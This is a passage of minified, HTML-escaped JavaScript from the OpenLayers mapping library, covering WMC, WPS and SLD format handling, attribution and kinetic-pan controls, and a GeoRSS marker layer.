f.legend.href,f.legend)),f=this.write_wmc_OnlineResource(f.href),c.appendChild(f),g.appendChild(c)):f.body?(c=this.createElementDefaultNS("SLD"),f.name&amp;&amp;c.appendChild(this.createElementDefaultNS("Name",f.name)),f.title&amp;&amp;c.appendChild(this.createElementDefaultNS("Title",f.title)),f.legend&amp;&amp;c.appendChild(this.write_wmc_URLType("LegendURL",f.legend.href,f.legend)),f=OpenLayers.Format.XML.prototype.read.apply(this,[f.body]).documentElement,c.ownerDocument&amp;&amp;c.ownerDocument.importNode&amp;&amp;(f=c.ownerDocument.importNode(f, !0)),c.appendChild(f),g.appendChild(c)):(g.appendChild(this.createElementDefaultNS("Name",f.name)),g.appendChild(this.createElementDefaultNS("Title",f.title)),f["abstract"]&amp;&amp;g.appendChild(this.createElementDefaultNS("Abstract",f["abstract"])),f.legend&amp;&amp;g.appendChild(this.write_wmc_URLType("LegendURL",f.legend.href,f.legend)));b.appendChild(g)}return b},write_wmc_OnlineResource:function(a){var b=this.createElementDefaultNS("OnlineResource");this.setAttributeNS(b,this.namespaces.xlink,"xlink:type", "simple");this.setAttributeNS(b,this.namespaces.xlink,"xlink:href",a);return b},getOnlineResource_href:function(a){var b={};a=a.getElementsByTagName("OnlineResource");0&lt;a.length&amp;&amp;this.read_wmc_OnlineResource(b,a[0]);return b.href},CLASS_NAME:"OpenLayers.Format.WMC.v1"});OpenLayers.Control.PanPanel=OpenLayers.Class(OpenLayers.Control.Panel,{slideFactor:50,slideRatio:null,initialize:function(a){OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);a={slideFactor:this.slideFactor,slideRatio:this.slideRatio};this.addControls([new OpenLayers.Control.Pan(OpenLayers.Control.Pan.NORTH,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.SOUTH,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.EAST,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.WEST,a)])}, CLASS_NAME:"OpenLayers.Control.PanPanel"});OpenLayers.Control.Attribution=OpenLayers.Class(OpenLayers.Control,{separator:", ",template:"${layers}",destroy:function(){this.map.events.un({removelayer:this.updateAttribution,addlayer:this.updateAttribution,changelayer:this.updateAttribution,changebaselayer:this.updateAttribution,scope:this});OpenLayers.Control.prototype.destroy.apply(this,arguments)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.map.events.on({changebaselayer:this.updateAttribution,changelayer:this.updateAttribution, addlayer:this.updateAttribution,removelayer:this.updateAttribution,scope:this});this.updateAttribution();return this.div},updateAttribution:function(){var a=[];if(this.map&amp;&amp;this.map.layers){for(var b=0,c=this.map.layers.length;b&lt;c;b++){var d=this.map.layers[b];d.attribution&amp;&amp;d.getVisibility()&amp;&amp;-1===OpenLayers.Util.indexOf(a,d.attribution)&amp;&amp;a.push(d.attribution)}this.div.innerHTML=OpenLayers.String.format(this.template,{layers:a.join(this.separator)})}},CLASS_NAME:"OpenLayers.Control.Attribution"});OpenLayers.Kinetic=OpenLayers.Class({threshold:0,deceleration:0.0035,nbPoints:100,delay:200,points:void 0,timerId:void 0,initialize:function(a){OpenLayers.Util.extend(this,a)},begin:function(){OpenLayers.Animation.stop(this.timerId);this.timerId=void 0;this.points=[]},update:function(a){this.points.unshift({xy:a,tick:(new Date).getTime()});this.points.length>this.nbPoints&amp;&amp;this.points.pop()},end:function(a){for(var b,c=(new Date).getTime(),d=0,e=this.points.length,f;d&lt;e;d++){f=this.points[d];if(c- f.tick>this.delay)break;b=f}if(b&amp;&amp;(d=(new Date).getTime()-b.tick,c=Math.sqrt(Math.pow(a.x-b.xy.x,2)+Math.pow(a.y-b.xy.y,2)),d=c/d,!(0==d||d&lt;this.threshold)))return c=Math.asin((a.y-b.xy.y)/c),b.xy.x&lt;=a.x&amp;&amp;(c=Math.PI-c),{speed:d,theta:c}},move:function(a,b){var c=a.speed,d=Math.cos(a.theta),e=-Math.sin(a.theta),f=(new Date).getTime(),g=0,h=0;this.timerId=OpenLayers.Animation.start(OpenLayers.Function.bind(function(){if(null!=this.timerId){var a=(new Date).getTime()-f,l=-this.deceleration*Math.pow(a, 2)/2+c*a,m=l*d,l=l*e,n,p;n=!1;0>=-this.deceleration*a+c&amp;&amp;(OpenLayers.Animation.stop(this.timerId),this.timerId=null,n=!0);a=m-g;p=l-h;g=m;h=l;b(a,p,n)}},this))},CLASS_NAME:"OpenLayers.Kinetic"});OpenLayers.Format.WPSExecute=OpenLayers.Class(OpenLayers.Format.XML,OpenLayers.Format.Filter.v1_1_0,{namespaces:{ows:"http://www.opengis.net/ows/1.1",gml:"http://www.opengis.net/gml",wps:"http://www.opengis.net/wps/1.0.0",wfs:"http://www.opengis.net/wfs",ogc:"http://www.opengis.net/ogc",wcs:"http://www.opengis.net/wcs",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},VERSION:"1.0.0", schemaLocation:"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd",schemaLocationAttr:function(a){},write:function(a){var b;window.ActiveXObject?this.xmldom=b=new ActiveXObject("Microsoft.XMLDOM"):b=document.implementation.createDocument("","",null);a=this.writeNode("wps:Execute",a,b);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},read:function(a){"string"==typeof a&amp;&amp;(a= OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},writers:{wps:{Execute:function(a){var b=this.createElementNSPlus("wps:Execute",{attributes:{version:this.VERSION,service:"WPS"}});this.writeNode("ows:Identifier",a.identifier,b);this.writeNode("wps:DataInputs",a.dataInputs,b);this.writeNode("wps:ResponseForm",a.responseForm,b);return b},ResponseForm:function(a){var b=this.createElementNSPlus("wps:ResponseForm",{});a.rawDataOutput&amp;&amp; this.writeNode("wps:RawDataOutput",a.rawDataOutput,b);a.responseDocument&amp;&amp;this.writeNode("wps:ResponseDocument",a.responseDocument,b);return b},ResponseDocument:function(a){var b=this.createElementNSPlus("wps:ResponseDocument",{attributes:{storeExecuteResponse:a.storeExecuteResponse,lineage:a.lineage,status:a.status}});if(a.outputs)for(var c=0,d=a.outputs.length;c&lt;d;c++)this.writeNode("wps:Output",a.outputs[c],b);return b},Output:function(a){var b=this.createElementNSPlus("wps:Output",{attributes:{asReference:a.asReference, mimeType:a.mimeType,encoding:a.encoding,schema:a.schema}});this.writeNode("ows:Identifier",a.identifier,b);this.writeNode("ows:Title",a.title,b);this.writeNode("ows:Abstract",a["abstract"],b);return b},RawDataOutput:function(a){var b=this.createElementNSPlus("wps:RawDataOutput",{attributes:{mimeType:a.mimeType,encoding:a.encoding,schema:a.schema}});this.writeNode("ows:Identifier",a.identifier,b);return b},DataInputs:function(a){for(var b=this.createElementNSPlus("wps:DataInputs",{}),c=0,d=a.length;c&lt; d;++c)this.writeNode("wps:Input",a[c],b);return b},Input:function(a){var b=this.createElementNSPlus("wps:Input",{});this.writeNode("ows:Identifier",a.identifier,b);a.title&amp;&amp;this.writeNode("ows:Title",a.title,b);a.data&amp;&amp;this.writeNode("wps:Data",a.data,b);a.reference&amp;&amp;this.writeNode("wps:Reference",a.reference,b);a.boundingBoxData&amp;&amp;this.writeNode("wps:BoundingBoxData",a.boundingBoxData,b);return b},Data:function(a){var b=this.createElementNSPlus("wps:Data",{});a.literalData?this.writeNode("wps:LiteralData", a.literalData,b):a.complexData?this.writeNode("wps:ComplexData",a.complexData,b):a.boundingBoxData&amp;&amp;this.writeNode("ows:BoundingBox",a.boundingBoxData,b);return b},LiteralData:function(a){return this.createElementNSPlus("wps:LiteralData",{attributes:{uom:a.uom},value:a.value})},ComplexData:function(a){var b=this.createElementNSPlus("wps:ComplexData",{attributes:{mimeType:a.mimeType,encoding:a.encoding,schema:a.schema}}),c=a.value;"string"===typeof c?b.appendChild(this.getXMLDoc().createCDATASection(a.value)): b.appendChild(c);return b},Reference:function(a){var b=this.createElementNSPlus("wps:Reference",{attributes:{mimeType:a.mimeType,"xlink:href":a.href,method:a.method,encoding:a.encoding,schema:a.schema}});a.body&amp;&amp;this.writeNode("wps:Body",a.body,b);return b},BoundingBoxData:function(a,b){this.writers.ows.BoundingBox.apply(this,[a,b,"wps:BoundingBoxData"])},Body:function(a){var b=this.createElementNSPlus("wps:Body",{});a.wcs?this.writeNode("wcs:GetCoverage",a.wcs,b):a.wfs?(this.featureType=a.wfs.featureType, this.version=a.wfs.version,this.writeNode("wfs:GetFeature",a.wfs,b)):this.writeNode("wps:Execute",a,b);return b}},wcs:OpenLayers.Format.WCSGetCoverage.prototype.writers.wcs,wfs:OpenLayers.Format.WFST.v1_1_0.prototype.writers.wfs,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc,ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.writers.ows},readers:{wps:{ExecuteResponse:function(a,b){b.executeResponse={lang:a.getAttribute("lang"),statusLocation:a.getAttribute("statusLocation"),serviceInstance:a.getAttribute("serviceInstance"), service:a.getAttribute("service")};this.readChildNodes(a,b.executeResponse)},Process:function(a,b){b.process={};this.readChildNodes(a,b.process)},Status:function(a,b){b.status={creationTime:a.getAttribute("creationTime")};this.readChildNodes(a,b.status)},ProcessSucceeded:function(a,b){b.processSucceeded=!0},ProcessOutputs:function(a,b){b.processOutputs=[];this.readChildNodes(a,b.processOutputs)},Output:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)},Reference:function(a,b){b.reference= {href:a.getAttribute("href"),mimeType:a.getAttribute("mimeType"),encoding:a.getAttribute("encoding"),schema:a.getAttribute("schema")}},Data:function(a,b){b.data={};this.readChildNodes(a,b)},LiteralData:function(a,b){b.literalData={dataType:a.getAttribute("dataType"),uom:a.getAttribute("uom"),value:this.getChildValue(a)}},ComplexData:function(a,b){b.complexData={mimeType:a.getAttribute("mimeType"),schema:a.getAttribute("schema"),encoding:a.getAttribute("encoding"),value:""};if(this.isSimpleContent(a)){var c; for(c=a.firstChild;c;c=c.nextSibling)switch(c.nodeType){case 3:case 4:b.complexData.value+=c.nodeValue}}else for(c=a.firstChild;c;c=c.nextSibling)1==c.nodeType&amp;&amp;(b.complexData.value=c)},BoundingBox:function(a,b){b.boundingBoxData={dimensions:a.getAttribute("dimensions"),crs:a.getAttribute("crs")};this.readChildNodes(a,b.boundingBoxData)}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WPSExecute"});OpenLayers.Layer.GeoRSS=OpenLayers.Class(OpenLayers.Layer.Markers,{location:null,features:null,formatOptions:null,selectedFeature:null,icon:null,popupSize:null,useFeedTitle:!0,initialize:function(a,b,c){OpenLayers.Layer.Markers.prototype.initialize.apply(this,[a,c]);this.location=b;this.features=[]},destroy:function(){OpenLayers.Layer.Markers.prototype.destroy.apply(this,arguments);this.clearFeatures();this.features=null},loadRSS:function(){this.loaded||(this.events.triggerEvent("loadstart"),OpenLayers.Request.GET({url:this.location, success:this.parseData,scope:this}),this.loaded=!0)},moveTo:function(a,b,c){OpenLayers.Layer.Markers.prototype.moveTo.apply(this,arguments);this.visibility&amp;&amp;!this.loaded&amp;&amp;this.loadRSS()},parseData:function(a){var b=a.responseXML;b&amp;&amp;b.documentElement||(b=OpenLayers.Format.XML.prototype.read(a.responseText));if(this.useFeedTitle){a=null;try{a=b.getElementsByTagNameNS("*","title")[0].firstChild.nodeValue}catch(c){a=b.getElementsByTagName("title")[0].firstChild.nodeValue}a&amp;&amp;this.setName(a)}a={};OpenLayers.Util.extend(a, this.formatOptions);this.map&amp;&amp;!this.projection.equals(this.map.getProjectionObject())&amp;&amp;(a.externalProjection=this.projection,a.internalProjection=this.map.getProjectionObject());b=(new OpenLayers.Format.GeoRSS(a)).read(b);a=0;for(var d=b.length;a&lt;d;a++){var e={},f=b[a];if(f.geometry){var g=f.attributes.title?f.attributes.title:"Untitled",h=f.attributes.description?f.attributes.description:"No description.",k=f.attributes.link?f.attributes.link:"",f=f.geometry.getBounds().getCenterLonLat();e.icon= null==this.icon?OpenLayers.Marker.defaultIcon():this.icon.clone();e.popupSize=this.popupSize?this.popupSize.clone():new OpenLayers.Size(250,120);if(g||h){e.title=g;e.description=h;var l='&lt;div class="olLayerGeoRSSClose">[x]&lt;/div>',l=l+'&lt;div class="olLayerGeoRSSTitle">';k&amp;&amp;(l+='&lt;a class="link" href="'+k+'" target="_blank">');l+=g;k&amp;&amp;(l+="&lt;/a>");l+="&lt;/div>";l+='&lt;div style="" class="olLayerGeoRSSDescription">';l+=h;l+="&lt;/div>";e.popupContentHTML=l}f=new OpenLayers.Feature(this,f,e);this.features.push(f); e=f.createMarker();e.events.register("click",f,this.markerClick);this.addMarker(e)}}this.events.triggerEvent("loadend")},markerClick:function(a){var b=this==this.layer.selectedFeature;this.layer.selectedFeature=b?null:this;for(var c=0,d=this.layer.map.popups.length;c&lt;d;c++)this.layer.map.removePopup(this.layer.map.popups[c]);b||(b=this.createPopup(),OpenLayers.Event.observe(b.div,"click",OpenLayers.Function.bind(function(){for(var a=0,b=this.layer.map.popups.length;a&lt;b;a++)this.layer.map.removePopup(this.layer.map.popups[a])}, this)),this.layer.map.addPopup(b));OpenLayers.Event.stop(a)},clearFeatures:function(){if(null!=this.features)for(;0&lt;this.features.length;){var a=this.features[0];OpenLayers.Util.removeItem(this.features,a);a.destroy()}},CLASS_NAME:"OpenLayers.Layer.GeoRSS"});OpenLayers.Symbolizer.Point=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:"OpenLayers.Symbolizer.Point"});OpenLayers.Symbolizer.Line=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:"OpenLayers.Symbolizer.Line"});OpenLayers.Symbolizer.Text=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:"OpenLayers.Symbolizer.Text"});OpenLayers.Format.SLD.v1=OpenLayers.Class(OpenLayers.Format.Filter.v1_0_0,{namespaces:{sld:"http://www.opengis.net/sld",ogc:"http://www.opengis.net/ogc",gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},defaultPrefix:"sld",schemaLocation:null,multipleSymbolizers:!1,featureTypeCounter:null,defaultSymbolizer:{fillColor:"#808080",fillOpacity:1,strokeColor:"#000000",strokeOpacity:1,strokeWidth:1,strokeDashstyle:"solid",pointRadius:3, graphicName:"square"},read:function(a,b){b=OpenLayers.Util.applyDefaults(b,this.options);var c={namedLayers:!0===b.namedLayersAsArray?[]:{}};this.readChildNodes(a,c);return c},readers:OpenLayers.Util.applyDefaults({sld:{StyledLayerDescriptor:function(a,b){b.version=a.getAttribute("version");this.readChildNodes(a,b)},Name:function(a,b){b.name=this.getChildValue(a)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b.description=this.getChildValue(a)},NamedLayer:function(a,b){var c= {userStyles:[],namedStyles:[]};this.readChildNodes(a,c);for(var d=0,e=c.userStyles.length;d&lt;e;++d)c.userStyles[d].layerName=c.name;OpenLayers.Util.isArray(b.namedLayers)?b.namedLayers.push(c):b.namedLayers[c.name]=c},NamedStyle:function(a,b){b.namedStyles.push(this.getChildName(a.firstChild))},UserStyle:function(a,b){var c={defaultsPerSymbolizer:!0,rules:[]};this.featureTypeCounter=-1;this.readChildNodes(a,c);this.multipleSymbolizers?(delete c.defaultsPerSymbolizer,c=new OpenLayers.Style2(c)):c=new OpenLayers.Style(this.defaultSymbolizer, c);b.userStyles.push(c)},IsDefault:function(a,b){"1"==this.getChildValue(a)&amp;&amp;(b.isDefault=!0)},FeatureTypeStyle:function(a,b){++this.featureTypeCounter;var c={rules:this.multipleSymbolizers?b.rules:[]};this.readChildNodes(a,c);this.multipleSymbolizers||(b.rules=c.rules)},Rule:function(a,b){var c;this.multipleSymbolizers&amp;&amp;(c={symbolizers:[]});c=new OpenLayers.Rule(c);this.readChildNodes(a,c);b.rules.push(c)},ElseFilter:function(a,b){b.elseFilter=!0},MinScaleDenominator:function(a,b){b.minScaleDenominator= parseFloat(this.getChildValue(a))},MaxScaleDenominator:function(a,b){b.maxScaleDenominator=parseFloat(this.getChildValue(a))},TextSymbolizer:function(a,b){var c={};this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Text(c))):b.symbolizer.Text=OpenLayers.Util.applyDefaults(c,b.symbolizer.Text)},LabelPlacement:function(a,b){this.readChildNodes(a,b)},PointPlacement:function(a,b){var c={};this.readChildNodes(a,c);c.labelRotation= c.rotation;delete c.rotation;var d,e=b.labelAnchorPointX,f=b.labelAnchorPointY;e&lt;=1/3?d="l":e>1/3&amp;&amp;e&lt;2/3?d="c":e>=2/3&amp;&amp;(d="r");f&lt;=1/3?d+="b":f>1/3&amp;&amp;f&lt;2/3?d+="m":f>=2/3&amp;&amp;(d+="t");c.labelAlign=d;OpenLayers.Util.applyDefaults(b,c)},AnchorPoint:function(a,b){this.readChildNodes(a,b)},AnchorPointX:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelAnchorPointX=c)},AnchorPointY:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelAnchorPointY=c)},Displacement:function(a, b){this.readChildNodes(a,b)},DisplacementX:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelXOffset=c)},DisplacementY:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelYOffset=c)},LinePlacement:function(a,b){this.readChildNodes(a,b)},PerpendicularOffset:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelPerpendicularOffset=c)},Label:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.label=c)},Font:function(a,b){this.readChildNodes(a, b)},Halo:function(a,b){var c={};this.readChildNodes(a,c);b.haloRadius=c.haloRadius;b.haloColor=c.fillColor;b.haloOpacity=c.fillOpacity},Radius:function(a,b){var c=this.readers.ogc._expression.call(this,a);null!=c&amp;&amp;(b.haloRadius=c)},RasterSymbolizer:function(a,b){var c={};this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Raster(c))):b.symbolizer.Raster=OpenLayers.Util.applyDefaults(c,b.symbolizer.Raster)},Geometry:function(a, b){b.geometry={};this.readChildNodes(a,b.geometry)},ColorMap:function(a,b){b.colorMap=[];this.readChildNodes(a,b.colorMap)},ColorMapEntry:function(a,b){var c=a.getAttribute("quantity"),d=a.getAttribute("opacity");b.push({color:a.getAttribute("color"),quantity:null!==c?parseFloat(c):void 0,label:a.getAttribute("label")||void 0,opacity:null!==d?parseFloat(d):void 0})},LineSymbolizer:function(a,b){var c={};this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Line(c))): b.symbolizer.Line=OpenLayers.Util.applyDefaults(c,b.symbolizer.Line)},PolygonSymbolizer:function(a,b){var c={fill:!1,stroke:!1};this.multipleSymbolizers||(c=b.symbolizer.Polygon||c);this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Polygon(c))):b.symbolizer.Polygon=c},PointSymbolizer:function(a,b){var c={fill:!1,stroke:!1,graphic:!1};this.multipleSymbolizers||(c=b.symbolizer.Point||c);this.readChildNodes(a,c);this.multipleSymbolizers? (c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Point(c))):b.symbolizer.Point=c},Stroke:function(a,b){b.stroke=!0;this.readChildNodes(a,b)},Fill:function(a,b){b.fill=!0;this.readChildNodes(a,b)},CssParameter:function(a,b){var c=a.getAttribute("name"),d=this.cssMap[c];b.label&amp;&amp;("fill"===c?d="fontColor":"fill-opacity"===c&amp;&amp;(d="fontOpacity"));d&amp;&amp;(c=this.readers.ogc._expression.call(this,a))&amp;&amp;(b[d]=c)},Graphic:function(a,b){b.graphic=!0;var c={};this.readChildNodes(a,c); for(var d="stroke strokeColor strokeWidth strokeOpacity strokeLinecap fill fillColor fillOpacity graphicName rotation graphicFormat".split(" "),e,f,g=0,h=d.length;g&lt;h;++g)e=d[g],f=c[e],void 0!=f&amp;&amp;(b[e]=f);void 0!=c.opacity&amp;&amp;(b.graphicOpacity=c.opacity);void 0!=c.size&amp;&amp;(isNaN(c.size/2)?b.graphicWidth=c.size:b.pointRadius=c.size/2);void 0!=c.href&amp;&amp;(b.externalGraphic=c.href);void 0!=c.rotation&amp;&amp;(b.rotation=c.rotation)},ExternalGraphic:function(a,b){this.readChildNodes(a,b)},Mark:function(a,b){this.readChildNodes(a, b)},WellKnownName:function(a,b){b.graphicName=this.getChildValue(a)},Opacity:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.opacity=c)},Size:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.size=c)},Rotation:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.rotation=c)},OnlineResource:function(a,b){b.href=this.getAttributeNS(a,this.namespaces.xlink,"href")},Format:function(a,b){b.graphicFormat=this.getChildValue(a)}}},OpenLayers.Format.Filter.v1_0_0.prototype.readers), cssMap:{stroke:"strokeColor","stroke-opacity":"strokeOpacity","stroke-width":"strokeWidth","stroke-linecap":"strokeLinecap","stroke-dasharray":"strokeDashstyle",fill:"fillColor","fill-opacity":"fillOpacity","font-family":"fontFamily","font-size":"fontSize","font-weight":"fontWeight","font-style":"fontStyle"},getCssProperty:function(a){var b=null,c;for(c in this.cssMap)if(this.cssMap[c]==a){b=c;break}return b},getGraphicFormat:function(a){var b,c;for(c in this.graphicFormats)if(this.graphicFormats[c].test(a)){b= c;break}return b||this.defaultGraphicFormat},defaultGraphicFormat:"image/png",graphicFormats:{"image/jpeg":/\.jpe?g$/i,"image/gif":/\.gif$/i,"image/png":/\.png$/i},write:function(a){return this.writers.sld.StyledLayerDescriptor.apply(this,[a])},writers:OpenLayers.Util.applyDefaults({sld:{_OGCExpression:function(a,b){var c=this.createElementNSPlus(a),d="string"==typeof b?b.split("${"):[b];c.appendChild(this.createTextNode(d[0]));for(var e,f,g=1,h=d.length;g&lt;h;g++)e=d[g],f=e.indexOf("}"),0&lt;f?(this.writeNode("ogc:PropertyName", {property:e.substring(0,f)},c),c.appendChild(this.createTextNode(e.substring(++f)))):c.appendChild(this.createTextNode("${"+e));return c},StyledLayerDescriptor:function(a){var b=this.createElementNSPlus("sld:StyledLayerDescriptor",{attributes:{version:this.VERSION,"xsi:schemaLocation":this.schemaLocation}});b.setAttribute("xmlns:ogc",this.namespaces.ogc);b.setAttribute("xmlns:gml",this.namespaces.gml);a.name&amp;&amp;this.writeNode("Name",a.name,b);a.title&amp;&amp;this.writeNode("Title",a.title,b);a.description&amp;&amp; this.writeNode("Abstract",a.description,b);if(OpenLayers.Util.isArray(a.namedLayers))for(var c=0,d=a.namedLayers.length;c&lt;d;++c)this.writeNode("NamedLayer",a.namedLayers[c],b);else for(c in a.namedLayers)this.writeNode("NamedLayer",a.namedLayers[c],b);return b},Name:function(a){return this.createElementNSPlus("sld:Name",{value:a})},Title:function(a){return this.createElementNSPlus("sld:Title",{value:a})},Abstract:function(a){return this.createElementNSPlus("sld:Abstract",{value:a})},NamedLayer:function(a){var b= this.createElementNSPlus("sld:NamedLayer");this.writeNode("Name",a.name,b);if(a.namedStyles)for(var c=0,d=a.namedStyles.length;c&lt;d;++c)this.writeNode("NamedStyle",a.namedStyles[c],b);if(a.userStyles)for(c=0,d=a.userStyles.length;c&lt;d;++c)this.writeNode("UserStyle",a.userStyles[c],b);return b},NamedStyle:function(a){var b=this.createElementNSPlus("sld:NamedStyle");this.writeNode("Name",a,b);return b},UserStyle:function(a){var b=this.createElementNSPlus("sld:UserStyle");a.name&amp;&amp;this.writeNode("Name", a.name,b);a.title&amp;&amp;this.writeNode("Title",a.title,b);a.description&amp;&amp;this.writeNode("Abstract",a.description,b);a.isDefault&amp;&amp;this.writeNode("IsDefault",a.isDefault,b);if(this.multipleSymbolizers&amp;&amp;a.rules){for(var c={0:[]},d=[0],e,f,g,h,k,l=0,m=a.rules.length;l&lt;m;++l)if(e=a.rules[l],e.symbolizers){f={};for(var n=0,p=e.symbolizers.length;n&lt;p;++n)g=e.symbolizers[n],h=g.zIndex,h in f||(k=e.clone(),k.symbolizers=[],f[h]=k),f[h].symbolizers.push(g.clone());for(h in f)h in c||(d.push(h),c[h]=[]),c[h].push(f[h])}else c[0].push(e.clone()); d.sort();l=0;for(m=d.length;l&lt;m;++l)e=c[d[l]],0&lt;e.length&amp;&amp;(k=a.clone(),k.rules=c[d[l]],this.writeNode("FeatureTypeStyle",k,b))}else this.writeNode("FeatureTypeStyle",a,b);return b},IsDefault:function(a){return this.createElementNSPlus("sld:IsDefault",{value:a?"1":"0"})},FeatureTypeStyle:function(a){for(var b=this.createElementNSPlus("sld:FeatureTypeStyle"),c=0,d=a.rules.length;c&lt;d;++c)this.writeNode("Rule",a.rules[c],b);return b},Rule:function(a){var b=this.createElementNSPlus("sld:Rule");a.name&amp;&amp; this.writeNode("Name",a.name,b);a.title&amp;&amp;this.writeNode("Title",a.title,b);a.description&amp;&amp;this.writeNode("Abstract",a.description,b);a.elseFilter?this.writeNode("ElseFilter",null,b):a.filter&amp;&amp;this.writeNode("ogc:Filter",a.filter,b);void 0!=a.minScaleDenominator&amp;&amp;this.writeNode("MinScaleDenominator",a.minScaleDenominator,b);void 0!=a.maxScaleDenominator&amp;&amp;this.writeNode("MaxScaleDenominator",a.maxScaleDenominator,b);var c,d;if(this.multipleSymbolizers&amp;&amp;a.symbolizers)for(var e=0,f=a.symbolizers.length;e&lt; f;++e)d=a.symbolizers[e],c=d.CLASS_NAME.split(".").pop(),this.writeNode(c+"Symbolizer",d,b);else for(var f=OpenLayers.Style.SYMBOLIZER_PREFIXES,e=0,g=f.length;e&lt;g;++e)c=f[e],(d=a.symbolizer[c])&amp;&amp;this.writeNode(c+"Symbolizer",d,b);return b},ElseFilter:function(){return this.createElementNSPlus("sld:ElseFilter")},MinScaleDenominator:function(a){return this.createElementNSPlus("sld:MinScaleDenominator",{value:a})},MaxScaleDenominator:function(a){return this.createElementNSPlus("sld:MaxScaleDenominator", {value:a})},LineSymbolizer:function(a){var b=this.createElementNSPlus("sld:LineSymbolizer");this.writeNode("Stroke",a,b);return b},Stroke:function(a){var b=this.createElementNSPlus("sld:Stroke");void 0!=a.strokeColor&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"strokeColor"},b);void 0!=a.strokeOpacity&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"strokeOpacity"},b);void 0!=a.strokeWidth&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"strokeWidth"},b);void 0!=a.strokeDashstyle&amp;&amp;"solid"!== a.strokeDashstyle&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"strokeDashstyle"},b);void 0!=a.strokeLinecap&amp;&amp;this.writeNode("CssParameter",{symbolizer:a,key:"strokeLinecap"},b);return b},CssParameter:function(a){return this.createElementNSPlus("sld:CssParameter",{attributes:{name:this.getCssProperty(a.key)},value:a.symbolizer[a.key]})},TextSymbolizer:function(a){var b=this.createElementNSPlus("sld:TextSymbolizer");null!=a.label&amp;&amp;this.writeNode("Label",a.label,b);null==a.fontFamily&amp;&amp;null==a.fontSize&amp;&amp; null==a.fontWeight&amp;&amp;null==a.fontStyle||this.writeNode("Font",a,b);null==a.labelAnchorPointX&amp;&amp;null==a.labelAnchorPointY&amp;&amp;null==a.labelAlign&amp;&amp;null==a.labelXOffset&amp;&amp;null==a.labelYOffset&amp;&amp;null==a.labelRotation&amp;&amp;null==a.labelPerpendicularOffset||this.writeNode("LabelPlacement",a,b);null==a.haloRadius&amp;&amp;null==a.haloColor&amp;&amp;null==a.haloOpacity||this.writeNode("Halo",a,b);null==a.fontColor&amp;&amp;null==a.fontOpacity||this.writeNode("Fill",{fillColor:a.fontColor,fillOpacity:a.fontOpacity},b);return b},LabelPlacement:function(a){var b= this.createElementNSPlus("sld:LabelPlacement");null==a.labelAnchorPointX&amp;&amp;null==a.labelAnchorPointY&amp;&amp;null==a.labelAlign&amp;&amp;null==a.labelXOffset&amp;&amp;null==a.labelYOffset&amp;&amp;null==a.labelRotation||null!=a.labelPerpendicularOffset||this.writeNode("PointPlacement",a,b);null!=a.labelPerpendicularOffset&amp;&amp;this.writeNode("LinePlacement",a,b);return b},LinePlacement:function(a){var b=this.createElementNSPlus("sld:LinePlacement");this.writeNode("PerpendicularOffset",a.labelPerpendicularOffset,b);return b},PerpendicularOffset:function(a){return this.createElementNSPlus("sld:PerpendicularOffset", {value:a})},PointPlacement:function(a){var 